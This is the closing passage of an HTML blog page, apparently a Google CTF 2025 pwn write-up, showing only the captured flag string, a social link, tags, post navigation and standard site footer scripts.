<p><strong>Flag: CTF{HowDidYouLeakMyPassword}</strong></p></blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/google-ctf-2025/" data-title="Google CTF 2025" data-via="Chovid99" data-hashtags="Writeup,Google CTF,pwn,unicorn,2025"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/google-ctf-2025/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/google-ctf/">Google CTF</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/unicorn/">Unicorn</a>,&nbsp;<a href="/tags/2025/">2025</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/greyctf-2025/" class="prev" rel="prev" title="GreyCTF 2025"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>GreyCTF 2025</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
